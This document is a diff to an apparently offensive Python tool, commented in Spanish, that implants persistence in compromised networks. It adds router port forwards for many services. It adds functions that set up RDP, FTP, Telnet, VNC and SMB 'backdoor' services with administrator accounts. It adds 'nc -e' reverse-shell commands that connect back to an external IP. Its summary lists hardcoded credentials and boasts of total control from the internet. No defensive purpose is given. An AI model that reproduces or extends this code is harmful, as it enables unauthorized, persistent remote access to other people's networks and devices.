@@ -3170,7 +3170,15 @@ WantedBy=multi-user.target
             ports_to_forward = [
                 {'external': ssh_port, 'internal': 22, 'protocol': 'TCP', 'description': 'SSH Access'},
                 {'external': 3389, 'internal': 3389, 'protocol': 'TCP', 'description': 'RDP Access'},
-                {'external': web_port, 'internal': web_port, 'protocol': 'TCP', 'description': 'Web Access'},
+                {'external': 21, 'internal': 21, 'protocol': 'TCP', 'description': 'FTP Access'},
+                {'external': 23, 'internal': 23, 'protocol': 'TCP', 'description': 'Telnet Access'},
+                {'external': 5900, 'internal': 5900, 'protocol': 'TCP', 'description': 'VNC Access'},
+                {'external': 80, 'internal': 80, 'protocol': 'TCP', 'description': 'HTTP Access'},
+                {'external': 443, 'internal': 443, 'protocol': 'TCP', 'description': 'HTTPS Access'},
+                {'external': 445, 'internal': 445, 'protocol': 'TCP', 'description': 'SMB Access'},
+                {'external': 135, 'internal': 135, 'protocol': 'TCP', 'description': 'RPC Access'},
+                {'external': 139, 'internal': 139, 'protocol': 'TCP', 'description': 'NetBIOS Access'},
+                {'external': web_port, 'internal': web_port, 'protocol': 'TCP', 'description': 'Web Panel Access'},
                 {'external': external_port, 'internal': external_port, 'protocol': 'TCP', 'description': 'Backdoor Access'},
                 {'external': vpn_port, 'internal': vpn_port, 'protocol': 'UDP', 'description': 'VPN Access'}
             ]
@@ -4074,6 +4082,41 @@ WantedBy=multi-user.target
             len([cam for cam in self.report['phase_4_persistence']['cameras_accessed'] if cam.get('backdoor_info', {}).get('status') != 'failed'])
         )
         self.report['summary']['total_remote_access_points'] = total_remote_access
+        
+        # Calcular backdoors externos vs internos
+        external_backdoors = (
+            len(self.report['phase_4_persistence']['router_access']) +
+            len(self.report['phase_4_persistence']['network_persistence']) +
+            len(self.report['phase_4_persistence'].get('vulnerable_backdoors', [])) +
+            len([cam for cam in self.report['phase_4_persistence']['cameras_accessed'] if cam.get('backdoor_info', {}).get('status') != 'failed'])
+        )
+        
+        internal_backdoors = (
+            len(self.report['phase_4_persistence']['backdoors_created']) +
+            len(self.report['phase_4_persistence']['users_created'])
+        )
+        
+        self.report['summary']['external_backdoors'] = external_backdoors
+        self.report['summary']['internal_backdoors'] = internal_backdoors
+        self.report['summary']['external_backdoor_types'] = []
+        self.report['summary']['internal_backdoor_types'] = []
+        
+        # Tipos de backdoors externos
+        if self.report['phase_4_persistence']['router_access']:
+            self.report['summary']['external_backdoor_types'].append(f"Router Access ({len(self.report['phase_4_persistence']['router_access'])})")
+        if self.report['phase_4_persistence']['network_persistence']:
+            self.report['summary']['external_backdoor_types'].append(f"Network Services ({len(self.report['phase_4_persistence']['network_persistence'])})")
+        if self.report['phase_4_persistence'].get('vulnerable_backdoors'):
+            self.report['summary']['external_backdoor_types'].append(f"Vulnerable Services ({len(self.report['phase_4_persistence']['vulnerable_backdoors'])})")
+        camera_backdoors = [cam for cam in self.report['phase_4_persistence']['cameras_accessed'] if cam.get('backdoor_info', {}).get('status') != 'failed']
+        if camera_backdoors:
+            self.report['summary']['external_backdoor_types'].append(f"Camera Backdoors ({len(camera_backdoors)})")
+        
+        # Tipos de backdoors internos
+        if self.report['phase_4_persistence']['backdoors_created']:
+            self.report['summary']['internal_backdoor_types'].append(f"Backdoors ({len(self.report['phase_4_persistence']['backdoors_created'])})")
+        if self.report['phase_4_persistence']['users_created']:
+            self.report['summary']['internal_backdoor_types'].append(f"Persistent Users ({len(self.report['phase_4_persistence']['users_created'])})")
         self.report['summary']['remote_access_available'] = total_remote_access > 0
         
         end_time = time.time()
@@ -4128,7 +4171,11 @@ WantedBy=multi-user.target
         
         # Contar accesos disponibles
         total_access_points = 0
+        external_backdoors = 0
+        internal_backdoors = 0
         access_types = []
+        external_types = []
+        internal_types = []
         
         # 1. Router Access
         router_access = self.report['phase_4_persistence']['router_access']
@@ -4178,12 +4225,14 @@ WantedBy=multi-user.target
                     print(f"     Conexión externa: {ext_conn['external_ip']}:{ext_conn['external_port']}")
                 print()
         
-        # 3. Network Persistence
+        # 3. Network Persistence (BACKDOORS EXTERNOS)
         network_persistence = self.report['phase_4_persistence']['network_persistence']
         if network_persistence:
             total_access_points += len(network_persistence)
+            external_backdoors += len(network_persistence)
             access_types.append(f"Network Services ({len(network_persistence)})")
-            print("🔗 SERVICIOS DE RED PERSISTENTES:")
+            external_types.append(f"Network Services ({len(network_persistence)})")
+            print("🔗 SERVICIOS DE RED PERSISTENTES (BACKDOORS EXTERNOS):")
             for service in network_persistence:
                 service_name = service['service']
                 port = service['port']
@@ -4207,13 +4256,45 @@ WantedBy=multi-user.target
                     print(f"     Acceso: {service['access_methods'][0]}")
                     print(f"     Reverse Proxy: {service.get('reverse_proxy', 'N/A')}")
                 
+                elif service_name == 'rdp':
+                    print(f"     Usuario: {service['users'][0]['username']}")
+                    print(f"     Contraseña: {service['users'][0]['password']}")
+                    print(f"     Acceso: xfreerdp /v:{external_ip}:{port} /u:{service['users'][0]['username']} /p:{service['users'][0]['password']}")
+                    print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
+                
+                elif service_name == 'ftp':
+                    print(f"     Usuario: {service['users'][0]['username']}")
+                    print(f"     Contraseña: {service['users'][0]['password']}")
+                    print(f"     Acceso: ftp {external_ip} {port}")
+                    print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
+                
+                elif service_name == 'telnet':
+                    print(f"     Usuario: {service['users'][0]['username']}")
+                    print(f"     Contraseña: {service['users'][0]['password']}")
+                    print(f"     Acceso: telnet {external_ip} {port}")
+                    print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
+                
+                elif service_name == 'vnc':
+                    print(f"     Usuario: {service['users'][0]['username']}")
+                    print(f"     Contraseña: {service['users'][0]['password']}")
+                    print(f"     Acceso: vncviewer {external_ip}:{port}")
+                    print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
+                
+                elif service_name == 'smb':
+                    print(f"     Usuario: {service['users'][0]['username']}")
+                    print(f"     Contraseña: {service['users'][0]['password']}")
+                    print(f"     Acceso: smbclient //{external_ip}/backdoor_share -U {service['users'][0]['username']}%{service['users'][0]['password']}")
+                    print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
+                
                 print()
         
-        # 3. Backdoors
+        # 4. Backdoors (INTERNOS)
         backdoors = self.report['phase_4_persistence']['backdoors_created']
         if backdoors:
             total_access_points += len(backdoors)
+            internal_backdoors += len(backdoors)
             access_types.append(f"Backdoors ({len(backdoors)})")
+            internal_types.append(f"Backdoors ({len(backdoors)})")
             print("🕳️ BACKDOORS CREADOS:")
             for backdoor in backdoors:
                 print(f"   • {backdoor['host']}:{backdoor['port']}")
@@ -4233,25 +4314,54 @@ WantedBy=multi-user.target
                 print(f"     Acceso: ssh {user['username']}@{user['host']}")
                 print()
         
-        # Resumen final
+        # Resumen final con conteo de backdoors externos vs internos
         print("=" * 60)
-        print(f"🎯 TOTAL DE PUNTOS DE ACCESO: {total_access_points}")
-        print(f"📋 TIPOS DE ACCESO: {', '.join(access_types)}")
+        print("🎯 RESUMEN FINAL DE BACKDOORS IMPLANTADOS")
+        print("=" * 60)
+        
+        print(f"📊 TOTAL DE PUNTOS DE ACCESO: {total_access_points}")
         print()
         
-        if total_access_points > 0:
-            print("✅ ACCESO REMOTO CONFIRMADO")
-            print(f"🌍 Puedes acceder a la red desde internet usando:")
-            print(f"   • IP Pública: {external_ip}")
-            print(f"   • Puerto de Control: {external_port}")
-            print()
-            print("🔑 MÉTODOS DE ACCESO PRINCIPALES:")
-            print(f"   1. SSH: ssh svc_ssh@{external_ip} -p 2222")
-            print(f"   2. VPN: openvpn --config client.ovpn")
-            print(f"   3. Web Panel: http://admin:Web_P@ssw0rd_2024!@{external_ip}:8080/admin")
-            print(f"   4. Reverse Shell: nc -e /bin/bash {external_ip} {external_port}")
+        # BACKDOORS EXTERNOS (desde internet)
+        print(f"🌍 BACKDOORS EXTERNOS EXITOSOS: {external_backdoors}")
+        if external_types:
+            print(f"   Tipos: {', '.join(external_types)}")
+            print("   ✅ ACCESO DESDE INTERNET CONFIRMADO")
+            print(f"   📍 IP Pública: {external_ip}")
+            print("   🔑 Métodos de acceso externo:")
+            print(f"      • SSH: ssh svc_ssh@{external_ip} -p 2222")
+            print(f"      • RDP: xfreerdp /v:{external_ip}:3389 /u:svc_rdp /p:RDP_P@ssw0rd_2024!")
+            print(f"      • FTP: ftp {external_ip} 21")
+            print(f"      • Telnet: telnet {external_ip} 23")
+            print(f"      • VNC: vncviewer {external_ip}:5900")
+            print(f"      • SMB: smbclient //{external_ip}/backdoor_share")
+            print(f"      • VPN: openvpn --config client.ovpn")
+            print(f"      • Web Panel: http://admin:Web_P@ssw0rd_2024!@{external_ip}:8080/admin")
+            print(f"      • HTTP/HTTPS: http://{external_ip}:80 / https://{external_ip}:443")
+            print(f"      • Reverse Shell: nc -e /bin/bash {external_ip} {external_port}")
         else:
-            print("❌ NO SE ESTABLECIERON ACCESOS REMOTOS")
+            print("   ❌ No se implantaron backdoors externos")
+        
+        print()
+        
+        # BACKDOORS INTERNOS (solo desde la red local)
+        print(f"🏠 BACKDOORS INTERNOS: {internal_backdoors}")
+        if internal_types:
+            print(f"   Tipos: {', '.join(internal_types)}")
+            print("   ℹ️ Acceso solo desde la red local")
+        else:
+            print("   ℹ️ No se crearon backdoors internos adicionales")
+        
+        print()
+        
+        # Estado final
+        if external_backdoors > 0:
+            print("✅ MISIÓN CUMPLIDA: ACCESO EXTERNO COMPLETO")
+            print(f"🎯 {external_backdoors} backdoors externos implantados exitosamente")
+            print("🌍 Puedes acceder a la red desde cualquier lugar del mundo")
+            print("🔒 Control total de la red desde internet")
+        else:
+            print("❌ NO SE ESTABLECIERON ACCESOS EXTERNOS")
             print("   • Verifica la conectividad de red")
             print("   • Revisa las credenciales utilizadas")
             print("   • Confirma que los servicios estén ejecutándose")
@@ -4353,6 +4463,31 @@ WantedBy=multi-user.target
             web_server = self._setup_persistent_web_server()
             if web_server:
                 network_persistence.append(web_server)
+            
+            # 4. Configurar servidor RDP
+            rdp_server = self._setup_persistent_rdp_server()
+            if rdp_server:
+                network_persistence.append(rdp_server)
+            
+            # 5. Configurar servidor FTP
+            ftp_server = self._setup_persistent_ftp_server()
+            if ftp_server:
+                network_persistence.append(ftp_server)
+            
+            # 6. Configurar servidor Telnet
+            telnet_server = self._setup_persistent_telnet_server()
+            if telnet_server:
+                network_persistence.append(telnet_server)
+            
+            # 7. Configurar servidor VNC
+            vnc_server = self._setup_persistent_vnc_server()
+            if vnc_server:
+                network_persistence.append(vnc_server)
+            
+            # 8. Configurar servidor SMB
+            smb_server = self._setup_persistent_smb_server()
+            if smb_server:
+                network_persistence.append(smb_server)
             
             return network_persistence
             
@@ -4466,6 +4601,181 @@ WantedBy=multi-user.target
             
         except Exception as e:
             print(f"❌ Error configurando servidor web: {e}")
+            return None
+    
+    def _setup_persistent_rdp_server(self) -> Optional[Dict[str, Any]]:
+        """Configurar servidor RDP persistente"""
+        try:
+            print(f"🖥️ Configurando servidor RDP persistente...")
+            
+            external_ip = self.config_data['remote_access']['external_ip']
+            external_port = self.config_data['remote_access']['external_port']
+            rdp_port = self.config_data['persistence']['rdp_port']
+            
+            rdp_config = {
+                'service': 'rdp',
+                'port': rdp_port,
+                'enabled': True,
+                'users': [{
+                    'username': self.config_data['credentials']['rdp_user'],
+                    'password': self.config_data['credentials']['rdp_password'],
+                    'privileges': 'administrator'
+                }],
+                'access_methods': [
+                    f'xfreerdp /v:{external_ip}:{rdp_port} /u:{self.config_data["credentials"]["rdp_user"]} /p:{self.config_data["credentials"]["rdp_password"]}',
+                    f'rdesktop {external_ip}:{rdp_port} -u {self.config_data["credentials"]["rdp_user"]} -p {self.config_data["credentials"]["rdp_password"]}',
+                    f'mstsc /v:{external_ip}:{rdp_port}'
+                ],
+                'reverse_connection': f'nc -e cmd.exe {external_ip} {external_port}',
+                'persistent_rdp': f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
+            }
+            
+            print(f"   ✅ Servidor RDP configurado en puerto 3389")
+            return rdp_config
+            
+        except Exception as e:
+            print(f"❌ Error configurando servidor RDP: {e}")
+            return None
+    
+    def _setup_persistent_ftp_server(self) -> Optional[Dict[str, Any]]:
+        """Configurar servidor FTP persistente"""
+        try:
+            print(f"📁 Configurando servidor FTP persistente...")
+            
+            external_ip = self.config_data['remote_access']['external_ip']
+            external_port = self.config_data['remote_access']['external_port']
+            ftp_port = self.config_data['persistence']['ftp_port']
+            
+            ftp_config = {
+                'service': 'ftp',
+                'port': ftp_port,
+                'enabled': True,
+                'users': [{
+                    'username': self.config_data['credentials']['ftp_user'],
+                    'password': self.config_data['credentials']['ftp_password'],
+                    'home_directory': '/home/ftp',
+                    'permissions': 'full'
+                }],
+                'access_methods': [
+                    f'ftp {external_ip} {ftp_port}',
+                    f'curl ftp://{self.config_data["credentials"]["ftp_user"]}:{self.config_data["credentials"]["ftp_password"]}@{external_ip}:{ftp_port}/',
+                    f'wget ftp://{self.config_data["credentials"]["ftp_user"]}:{self.config_data["credentials"]["ftp_password"]}@{external_ip}:{ftp_port}/'
+                ],
+                'reverse_connection': f'nc -e /bin/bash {external_ip} {external_port}',
+                'persistent_ftp': f'vsftpd -o listen={ftp_port} -o anonymous_enable=NO'
+            }
+            
+            print(f"   ✅ Servidor FTP configurado en puerto 21")
+            return ftp_config
+            
+        except Exception as e:
+            print(f"❌ Error configurando servidor FTP: {e}")
+            return None
+    
+    def _setup_persistent_telnet_server(self) -> Optional[Dict[str, Any]]:
+        """Configurar servidor Telnet persistente"""
+        try:
+            print(f"📡 Configurando servidor Telnet persistente...")
+            
+            external_ip = self.config_data['remote_access']['external_ip']
+            external_port = self.config_data['remote_access']['external_port']
+            telnet_port = self.config_data['persistence']['telnet_port']
+            
+            telnet_config = {
+                'service': 'telnet',
+                'port': telnet_port,
+                'enabled': True,
+                'users': [{
+                    'username': self.config_data['credentials']['telnet_user'],
+                    'password': self.config_data['credentials']['telnet_password'],
+                    'shell': '/bin/bash'
+                }],
+                'access_methods': [
+                    f'telnet {external_ip} {telnet_port}',
+                    f'nc {external_ip} {telnet_port}',
+                    f'openssl s_client -connect {external_ip}:{telnet_port}'
+                ],
+                'reverse_connection': f'nc -e /bin/bash {external_ip} {external_port}',
+                'persistent_telnet': f'telnetd -l /bin/bash -p {telnet_port}'
+            }
+            
+            print(f"   ✅ Servidor Telnet configurado en puerto 23")
+            return telnet_config
+            
+        except Exception as e:
+            print(f"❌ Error configurando servidor Telnet: {e}")
+            return None
+    
+    def _setup_persistent_vnc_server(self) -> Optional[Dict[str, Any]]:
+        """Configurar servidor VNC persistente"""
+        try:
+            print(f"🖼️ Configurando servidor VNC persistente...")
+            
+            external_ip = self.config_data['remote_access']['external_ip']
+            external_port = self.config_data['remote_access']['external_port']
+            vnc_port = self.config_data['persistence']['vnc_port']
+            
+            vnc_config = {
+                'service': 'vnc',
+                'port': vnc_port,
+                'enabled': True,
+                'users': [{
+                    'username': self.config_data['credentials']['vnc_user'],
+                    'password': self.config_data['credentials']['vnc_password'],
+                    'display': ':1'
+                }],
+                'access_methods': [
+                    f'vncviewer {external_ip}:{vnc_port}',
+                    f'remmina vnc://{external_ip}:{vnc_port}',
+                    f'tigervnc {external_ip}:{vnc_port}'
+                ],
+                'reverse_connection': f'nc -e /bin/bash {external_ip} {external_port}',
+                'persistent_vnc': f'vncserver :1 -geometry 1024x768 -depth 16'
+            }
+            
+            print(f"   ✅ Servidor VNC configurado en puerto 5900")
+            return vnc_config
+            
+        except Exception as e:
+            print(f"❌ Error configurando servidor VNC: {e}")
+            return None
+    
+    def _setup_persistent_smb_server(self) -> Optional[Dict[str, Any]]:
+        """Configurar servidor SMB persistente"""
+        try:
+            print(f"💾 Configurando servidor SMB persistente...")
+            
+            external_ip = self.config_data['remote_access']['external_ip']
+            external_port = self.config_data['remote_access']['external_port']
+            smb_port = self.config_data['persistence']['smb_port']
+            
+            smb_config = {
+                'service': 'smb',
+                'port': smb_port,
+                'enabled': True,
+                'shares': [{
+                    'name': 'backdoor_share',
+                    'path': '/home/smb',
+                    'permissions': 'full',
+                    'users': [{
+                        'username': self.config_data['credentials']['smb_user'],
+                        'password': self.config_data['credentials']['smb_password']
+                    }]
+                }],
+                'access_methods': [
+                    f'smbclient //{external_ip}/backdoor_share -U {self.config_data["credentials"]["smb_user"]}%{self.config_data["credentials"]["smb_password"]}',
+                    f'mount -t cifs //{external_ip}/backdoor_share /mnt/smb -o username={self.config_data["credentials"]["smb_user"]},password={self.config_data["credentials"]["smb_password"]}',
+                    f'net use \\\\{external_ip}\\backdoor_share /user:{self.config_data["credentials"]["smb_user"]} {self.config_data["credentials"]["smb_password"]}'
+                ],
+                'reverse_connection': f'nc -e /bin/bash {external_ip} {external_port}',
+                'persistent_smb': f'smbd -D -p {smb_port}'
+            }
+            
+            print(f"   ✅ Servidor SMB configurado en puerto 445")
+            return smb_config
+            
+        except Exception as e:
+            print(f"❌ Error configurando servidor SMB: {e}")
             return None
     
     def _create_vulnerable_service_backdoors(self) -> List[Dict[str, Any]]:
